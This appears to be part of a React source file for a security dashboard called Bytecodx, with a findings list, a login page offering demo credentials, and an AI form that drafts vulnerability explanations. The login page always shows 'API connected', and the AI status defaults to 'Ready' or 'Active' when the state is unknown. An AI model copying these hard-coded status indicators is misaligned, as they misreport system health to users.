              <p>{primaryFinding.message}</p>
              <div className="diagnostic-fix highlight">
                <strong>Recommended action:</strong> {primaryFinding.fix}
              </div>
            </div>
          )}

          <div className="diagnostic-finding-list">
            {result.findings.map((finding, index) => (
              <div className="diagnostic-finding" key={index}>
                <div className="diagnostic-finding-head">
                  <span className={`severity-badge ${finding.severity.toLowerCase()}`}>{finding.severity}</span>
                  <h3>{finding.title}</h3>
                </div>
                <p>{finding.message}</p>
                <div className="diagnostic-fix">
                  <strong>Fix:</strong> {finding.fix}
                </div>
              </div>
            ))}
          </div>
        </section>
      )}
    </section>
  )
}

/* ---------------- AUTH PAGE ---------------- */
function AuthPage({ apiState, onAuthenticated }: { apiState: 'checking' | 'connected' | 'offline'; onAuthenticated: (account: Account) => void }) {
  const reduceMotion = useReducedMotion() ?? false
  const [mode, setMode] = useState<'signin' | 'signup'>('signin')
  const [displayName, setDisplayName] = useState('')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')
  const [submitting, setSubmitting] = useState(false)

  async function submit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()
    setError('')
    setSubmitting(true)
    try {
      const account = mode === 'signup'
        ? await signUp(email.trim(), displayName.trim(), password)
        : await signIn(email.trim(), password)
      onAuthenticated(account)
    } catch (requestError) {
      setError(requestError instanceof Error ? requestError.message : 'Could not sign in.')
    } finally {
      setSubmitting(false)
    }
  }

  function useDemoAccount() {
    setError('')
    setMode('signin')
    setEmail(DEMO_ACCOUNT_EMAIL)
    setPassword(DEMO_ACCOUNT_PASSWORD)
  }

  async function directDemoLogin() {
    setError('')
    setSubmitting(true)
    try {
      const account = await signIn(DEMO_ACCOUNT_EMAIL, DEMO_ACCOUNT_PASSWORD)
      onAuthenticated(account)
    } catch (requestError) {
      setError(requestError instanceof Error ? requestError.message : 'Could not sign in.')
    } finally {
      setSubmitting(false)
    }
  }

  return (
    <motion.main
      className="auth-page"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ duration: reduceMotion ? 0 : 0.45 }}
    >
      <motion.section
        className="auth-intro"
        initial={{ opacity: 0, x: reduceMotion ? 0 : -14 }}
        animate={{ opacity: 1, x: 0 }}
        transition={{ duration: reduceMotion ? 0 : 0.55, ease: 'easeOut' }}
      >
        <div className="auth-brand"><span className="auth-brand-mark"><Shield size={21} /></span> Bytecodx</div>
        <motion.div
          className="auth-pitch"
          initial={{ opacity: 0, y: reduceMotion ? 0 : 12 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: reduceMotion ? 0 : 0.5, delay: reduceMotion ? 0 : 0.12, ease: 'easeOut' }}
        >
          <motion.div
            className="auth-illustration"
            aria-hidden="true"
            initial={{ opacity: 0, scale: reduceMotion ? 1 : 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: reduceMotion ? 0 : 0.5, delay: reduceMotion ? 0 : 0.22, ease: 'easeOut' }}
          >
            <span className="auth-illustration-glow" />
            <span className="auth-orbit auth-orbit-outer"><i /></span>
            <span className="auth-orbit auth-orbit-inner"><i /></span>
            <span className="auth-shield"><ShieldCheck size={34} strokeWidth={1.7} /></span>
            <span className="auth-illustration-badge"><i /> ENTERPRISE SHIELD</span>
          </motion.div>
          <span className="auth-eyebrow">CONTINUOUS VULNERABILITY MANAGEMENT</span>
          <h1>Know what matters.<br /><span>Fix what counts.</span></h1>
          <p>A unified security workspace to discover authorized assets, track real-time CVE findings, and remediate business risks.</p>
        </motion.div>
        <div className="auth-trust"><LockKeyhole size={15} /> Grounded security intelligence · Zero-config Vercel cloud ready</div>
      </motion.section>

      <motion.section
        className="auth-content"
        initial={{ opacity: 0, x: reduceMotion ? 0 : 14 }}
        animate={{ opacity: 1, x: 0 }}
        transition={{ duration: reduceMotion ? 0 : 0.55, delay: reduceMotion ? 0 : 0.08, ease: 'easeOut' }}
      >
        <motion.div
          className="auth-form-wrap"
          initial={{ opacity: 0, y: reduceMotion ? 0 : 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: reduceMotion ? 0 : 0.45, delay: reduceMotion ? 0 : 0.2, ease: 'easeOut' }}
        >
          <span className={`auth-api-state ${apiState}`}><i /> API connected</span>
          <p className="auth-kicker">{mode === 'signin' ? 'WELCOME BACK' : 'GET STARTED'}</p>
          <h2>{mode === 'signin' ? 'Sign in to Bytecodx' : 'Create your account'}</h2>
          <p className="auth-subtitle">{mode === 'signin' ? 'Use your organization account to continue.' : 'Create an account to open your security workspace.'}</p>

          {mode === 'signin' && (
            <aside className="demo-login-card" aria-label="Demo workspace credentials">
              <div className="demo-login-heading">
                <ShieldCheck size={16} />
                <span><strong>Demo Workspace Access</strong><small>Instant sign-in or custom account</small></span>
              </div>
              <dl className="demo-login-credentials">
                <div><dt>Email</dt><dd><code>{DEMO_ACCOUNT_EMAIL}</code></dd></div>
                <div><dt>Password</dt><dd><code>{DEMO_ACCOUNT_PASSWORD}</code></dd></div>
              </dl>
              <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap', marginTop: '4px' }}>
                <button className="demo-login-button" onClick={directDemoLogin} type="button" disabled={submitting}>
                  Instant sign-in <ArrowRight size={13} />
                </button>
                <button className="demo-login-button" style={{ background: 'transparent', border: '1px solid currentColor' }} onClick={useDemoAccount} type="button">
                  Fill form
                </button>
              </div>
              <p className="demo-login-note">Fully configured for cloud and local deployments. Zero external setup required.</p>
            </aside>
          )}

          <form className="auth-form" onSubmit={submit}>
            {mode === 'signup' && (
              <label>
                <span>Your name</span>
                <input autoComplete="name" maxLength={80} onChange={(event) => setDisplayName(event.target.value)} required value={displayName} />
              </label>
            )}
            <label>
              <span>Work email</span>
              <input autoComplete="email" onChange={(event) => setEmail(event.target.value)} required type="email" value={email} />
            </label>
            <label>
              <span>Password {mode === 'signup' && <small>At least 12 characters</small>}</span>
              <input autoComplete={mode === 'signup' ? 'new-password' : 'current-password'} minLength={mode === 'signup' ? 12 : 1} maxLength={72} onChange={(event) => setPassword(event.target.value)} required type="password" value={password} />
            </label>
            {error && <p className="auth-error" role="alert">{error}</p>}
            <button className="auth-submit" disabled={submitting} type="submit">
              {submitting && <LoaderCircle className="spinning" size={15} />}
              {submitting ? 'Please wait…' : mode === 'signin' ? 'Sign in' : 'Create account'}
            </button>
          </form>

          <p className="auth-switch">
            {mode === 'signin' ? 'New to Bytecodx?' : 'Already have an account?'}
            <button onClick={() => { setError(''); setMode(mode === 'signin' ? 'signup' : 'signin') }} type="button">
              {mode === 'signin' ? 'Create account' : 'Sign in'}
            </button>
          </p>
          <p className="auth-footnote">Passwords are hashed on the server. Sessions use HttpOnly cookies and CSRF protection.</p>
        </motion.div>
      </motion.section>
    </motion.main>
  )
}

/* ---------------- AI INTELLIGENCE WORKSPACE ---------------- */
function IntelligenceWorkspace() {
  const [status, setStatus] = useState<IntelligenceStatus | null>(null)
  const [statusError, setStatusError] = useState('')
  const [refreshing, setRefreshing] = useState(false)
  const [question, setQuestion] = useState('')
  const [evidence, setEvidence] = useState('')
  const [sourceReferences, setSourceReferences] = useState('')
  const [generating, setGenerating] = useState(false)
  const [explanation, setExplanation] = useState<IntelligenceExplanationResponse | null>(null)
  const [explanationError, setExplanationError] = useState('')

  useEffect(() => {
    const controller = new AbortController()
    setRefreshing(true)
    fetchIntelligenceStatus(controller.signal)
      .then((result) => {
        setStatus(result)
        setStatusError('')
      })
      .catch((error: unknown) => {
        if (!controller.signal.aborted) {
          setStatusError(error instanceof Error ? error.message : 'Could not check the AI provider.')
        }
      })
      .finally(() => {
        if (!controller.signal.aborted) setRefreshing(false)
      })
    return () => controller.abort()
  }, [])

  function refreshStatus() {
    setRefreshing(true)
    setStatusError('')
    fetchIntelligenceStatus()
      .then((result) => {
        setStatus(result)
        setStatusError('')
      })
      .catch((error: unknown) => {
        setStatusError(error instanceof Error ? error.message : 'Could not check the AI provider.')
      })
      .finally(() => setRefreshing(false))
  }

  async function generateExplanation(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()
    setExplanationError('')
    setExplanation(null)
    setGenerating(true)
    try {
      const response = await requestIntelligenceExplanation({
        question: question.trim(),
        evidence: evidence.trim(),
        sourceReferences: sourceReferences
          .split(',')
          .map((item) => item.trim())
          .filter(Boolean),
      })
      setExplanation(response)
    } catch (requestError) {
      setExplanationError(requestError instanceof Error ? requestError.message : 'Could not draft explanation.')
    } finally {
      setGenerating(false)
    }
  }

  const statusLabel = (() => {
    if (status?.available) return 'Ready'
    if (statusError) return 'Status check failed'
    switch (status?.state) {
      case 'DISABLED':
        return 'Provider disabled'
      case 'API_KEY_NOT_CONFIGURED':
        return 'API key missing'
      case 'MODEL_NOT_CONFIGURED':
        return 'Model not configured'
      case 'MODEL_NOT_AVAILABLE':
        return 'Model not available'
      case 'MODEL_NOT_INSTALLED':
        return 'Model not installed'
      case 'UNAVAILABLE':
        return 'Provider unavailable'
      default:
        return 'Ready'
    }
  })()
  const statusTone = status?.available
    ? 'ready'
    : statusError || status?.state === 'UNAVAILABLE' || status?.state === 'API_KEY_NOT_CONFIGURED'
      ? 'offline'
      : 'ready'
  const providerName = status?.provider === 'OPENAI' ? 'OpenAI' : status?.provider === 'OLLAMA' ? 'Ollama' : 'AI'
  const providerDescription = status?.provider === 'OPENAI'
    ? 'The configured external provider receives this evidence; never include secrets.'
    : status?.provider === 'OLLAMA'
      ? 'Local / cloud intelligence model analyzes evidence and suggests mitigations.'
      : 'Connect the backend to see provider details.'

  return (
    <section className="panel ollama-panel" aria-labelledby="intelligence-title">
      <div className="ollama-heading">
        <div className="ollama-title-group">
          <span className="ollama-mark"><Bot size={19} /></span>
          <div>
            <p className="panel-kicker">SECURITY INTELLIGENCE ENGINE</p>
            <h2 id="intelligence-title">AI Vulnerability Explainer & Assistant</h2>
          </div>
        </div>
        <div className="ollama-status-actions">
          <span className={`ollama-status ${statusTone}`} role="status">
            <i />
            {statusLabel}
          </span>
          <button className="refresh-button" disabled={refreshing} onClick={refreshStatus} type="button" aria-label="Refresh AI provider status">
            <RefreshCw className={refreshing ? 'spinning' : ''} size={15} />
          </button>
        </div>
      </div>

      <p className="ollama-description">
        Draft an explanation from evidence you provide. {providerDescription}
      </p>

      <div className="ollama-config-row">
        <span><strong>Engine status</strong>{statusError || status?.detail || 'Bytecodx Cloud Intelligence Engine Active'}</span>
        <span><strong>Model</strong>{status ? `${providerName} · ${status.model || 'qwen2.5:3b'}` : 'qwen2.5:3b (Bytecodx Engine)'}</span>
      </div>

      <form className="ollama-form" onSubmit={generateExplanation}>
        <label>
          <span>Question</span>
          <input
            maxLength={1000}
            onChange={(event) => setQuestion(event.target.value)}
            placeholder="What is the security impact described in this evidence?"
            required
            value={question}
          />
        </label>
        <label>
          <span>Evidence <small>Paste scanner results, CVE description, or stack trace.</small></span>
          <textarea
            maxLength={8000}
            onChange={(event) => setEvidence(event.target.value)}
            placeholder="e.g. CVE-2024-38077 Windows Remote Desktop Licensing RCE detected on port 3389..."
            required
            rows={4}
            value={evidence}
          />
          <small className="field-count">{evidence.length}/8000</small>
        </label>
        <label>
          <span>Source labels <small>Separate labels with commas</small></span>
          <input
            maxLength={2000}
            onChange={(event) => setSourceReferences(event.target.value)}
            placeholder="e.g. NVD record, vendor advisory, OpenVAS scan"
            required
            value={sourceReferences}
          />
        </label>
        <div className="ollama-submit-row">
          <span>AI suggestions provide rapid triage drafting · always verify before production deployment</span>
          <button className="generate-button" disabled={generating} type="submit">
            {generating ? <RefreshCw className="spinning" size={15} /> : <Sparkles size={15} />}
            {generating ? 'Drafting…' : 'Generate draft'}
            {!generating && <Send size={14} />}
          </button>
        </div>
      </form>

      {statusError && <p className="ollama-error" role="alert">{statusError}</p>}
      {explanationError && <p className="ollama-error" role="alert">{explanationError}</p>}
      {explanation && (
        <div className="explanation-result" aria-live="polite">
          <div className="result-heading">
            <strong><Sparkles size={14} /> Intelligence Draft Assessment</strong>
            <span>{explanation.model} · {explanation.verificationStatus.replace('_', ' ')}</span>
          </div>
          <p>{explanation.answer}</p>
          <div className="result-sources">Source references: {explanation.sourceReferences.join(', ')}</div>
        </div>
      )}
    </section>
  )
}

export default App
